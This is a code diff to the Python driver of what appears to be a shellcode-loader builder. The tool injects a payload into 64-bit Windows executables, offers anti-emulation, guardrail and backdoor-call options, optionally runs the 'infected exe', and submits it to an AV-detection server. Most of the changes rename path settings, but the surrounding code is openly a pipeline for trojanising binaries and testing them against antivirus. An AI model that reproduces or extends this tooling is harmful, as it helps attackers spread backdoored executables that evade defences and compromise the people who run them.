@@ -54,10 +54,18 @@ def main():
     else:
         setup_logging(logging.INFO)
 
+    # IN:
+    #   Shellcode: filename
+    #   Inject: filename
+    settings.injectable_base = args.inject
+    settings.payload_base = args.shellcode
+
+    # Cleanup
     settings.try_start_final_infected_exe = args.start
     settings.cleanup_files_on_start = not args.no_clean_at_start
     settings.cleanup_files_on_exit =not args.no_clean_at_exit
 
+    # Settings
     settings.fix_missing_iat = not args.no_fix_iat
     if args.guardrail:
         settings.plugin_guardrail = args.guardrail
@@ -71,13 +79,6 @@ def main():
             settings.plugin_guardrail_data_key,
             settings.plugin_guardrail_data_value))
 
-    # Shellcode: filename
-    # Inject: filename
-    settings.init_payload_injectable(
-        shellcode=FilePath(args.shellcode),
-        injectable=FilePath(args.inject),
-        dll_func="")
-
     settings.decoder_style = args.decoder
     settings.carrier_name = args.carrier
     settings.payload_location = PayloadLocation.CODE  # makes sense
@@ -89,11 +90,10 @@ def main():
         settings.carrier_invoke_style = CarrierInvokeStyle.BackdoorCallInstr
     settings.plugin_antiemulation = args.antiemulation
 
-    if not os.path.exists(settings.main_dir):
-        logger.info("Creating project directory: {}".format(settings.main_dir))
-        os.makedirs(settings.main_dir)
+    if not os.path.exists(settings.project_path):
+        logger.info("Creating project directory: {}".format(settings.project_path))
+        os.makedirs(settings.project_path)
     
-    write_webproject("default", settings)
     exit_code = start(settings)
     exit(exit_code)
 
@@ -124,7 +124,7 @@ def start(settings: Settings) -> int:
             ret = start_real(settings)
         except Exception as e:
             logger.error(f'Error compiling: {e}')
-            observer.write_logs(settings.main_dir)
+            observer.write_logs(settings.project_path)
             return 1
     
     # Cleanup files
@@ -133,16 +133,16 @@ def start(settings: Settings) -> int:
         clean_files(settings)
 
     # Write logs (on success)
-    observer.write_logs(settings.main_dir)
+    observer.write_logs(settings.project_path)
     return ret
 
 
 def sanity_checks(settings):
     if 'dll_loader' in settings.carrier_name:
-        if not settings.payload_path.endswith(".dll"):
+        if not settings.get_payload_path().endswith(".dll"):
             raise Exception("dll loader requires a dll as payload, not shellcode")
     else:
-        if not settings.payload_path.endswith(".bin"):
+        if not settings.get_payload_path().endswith(".bin"):
             raise Exception("loader requires shellcode as payload, not DLL")
 
 
@@ -158,7 +158,7 @@ def start_real(settings: Settings) -> bool:
 
     # CHECK if 64 bit
     if not project.injectable.superpe.is_64():
-        raise Exception("Binary is not 64bit: {}".format(project.settings.inject_exe_in))
+        raise Exception("Binary is not 64bit: {}".format(project.settings.get_inject_exe_in()))
 
     # Tell user if they attempt to do something stupid
     sanity_checks(project.settings)
@@ -192,8 +192,8 @@ def start_real(settings: Settings) -> bool:
     if settings.generate_asm_from_c:
         try:
             phases.compiler.compile(
-                c_in = settings.main_c_path, 
-                asm_out = settings.main_asm_path,
+                c_in = settings.project_c_path, 
+                asm_out = settings.project_asm_path,
                 injectable = project.injectable,
                 settings = project.settings)
         except ChildProcessError as e:
@@ -212,8 +212,8 @@ def start_real(settings: Settings) -> bool:
 
     # ASSEMBLE: Assemble .asm to .shc (ASM -> SHC)
     carrier_shellcode: bytes = phases.assembler.asm_to_shellcode(
-        asm_in = settings.main_asm_path, 
-        build_exe = settings.main_exe_path)
+        asm_in = settings.project_asm_path, 
+        build_exe = settings.project_exe_path)
     observer.add_code_file("carrier_shc", carrier_shellcode)
 
     # INJECT loader into an exe and do IAT & data references. Big task.
@@ -227,13 +227,13 @@ def start_real(settings: Settings) -> bool:
         injector.inject_exe()
     except Exception as e:
         return False
-    #observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))
+    #observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.get_inject_exe_out(), 300))
 
     # Check binary with avred
     if config.get("avred_server") != "":
         if settings.verify or settings.try_start_final_infected_exe:
-            filename = os.path.basename(settings.inject_exe_in)
-            with open(settings.inject_exe_out, "rb") as f:
+            filename = os.path.basename(settings.get_inject_exe_in())
+            with open(settings.get_inject_exe_out(), "rb") as f:
                 data = f.read()
             scannerDetectsBytes(data, filename, useBrotli=True, verify=settings.verify)
     else:
@@ -241,12 +241,12 @@ def start_real(settings: Settings) -> bool:
         if settings.verify:
             logger.info("    Verify infected exe")
             payload_exit_code = phases.injector.verify_injected_exe(
-                settings.inject_exe_out,
+                settings.get_inject_exe_out(),
                 dllfunc=settings.dllfunc)
             if payload_exit_code != 0:
                 logger.warning("Payload exit code: {}".format(payload_exit_code))
         elif settings.try_start_final_infected_exe:
-            run_exe(settings.inject_exe_out, dllfunc=settings.dllfunc, check=False)
+            run_exe(settings.get_inject_exe_out(), dllfunc=settings.dllfunc, check=False)
 
     if settings.plugin_guardrail != "none":
         logger.warning("! Remember your guardrails settings when testing")
